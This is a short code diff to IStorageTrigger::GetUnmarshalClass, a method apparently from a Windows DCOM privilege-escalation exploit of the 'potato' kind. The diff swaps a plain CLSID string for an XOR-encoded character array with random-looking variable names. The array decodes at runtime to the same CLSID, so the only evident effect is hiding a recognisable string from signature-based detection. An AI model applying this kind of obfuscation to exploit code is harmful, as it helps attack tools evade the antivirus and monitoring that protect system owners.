@@ -24,7 +24,13 @@ HRESULT IStorageTrigger::GetMarshalSizeMax(const IID &riid, void *pv, DWORD dwDe
 }
 
 HRESULT IStorageTrigger::GetUnmarshalClass(const IID &riid, void *pv, DWORD dwDestContext, void *pvDestContext, DWORD mshlflags, CLSID *pCid) {
-	CLSIDFromString(OLESTR("{00000306-0000-0000-c000-000000000046}"), pCid);
+	
+	 wchar_t  hid________SlEyampQQ7lE[] = {'\x3e','\x75','\x75','\x75','\x75','\x75','\x76','\x75','\x73','\x68','\x75','\x75','\x75','\x75','\x68','\x75','\x75','\x75','\x75','\x68','\x26','\x75','\x75','\x75','\x68','\x75','\x75','\x75','\x75','\x75','\x75','\x75','\x75','\x75','\x75','\x71','\x73','\x38','\x45'};
+ wchar_t  k_exrcCnH40QaE = '\x45';
+for( wchar_t  &x : hid________SlEyampQQ7lE){
+x = x ^ k_exrcCnH40QaE;
+}
+CLSIDFromString(hid________SlEyampQQ7lE, pCid);
 	//printf("IStorageTrigger GetUnmarshalClass\n");
 	return 0;
 }
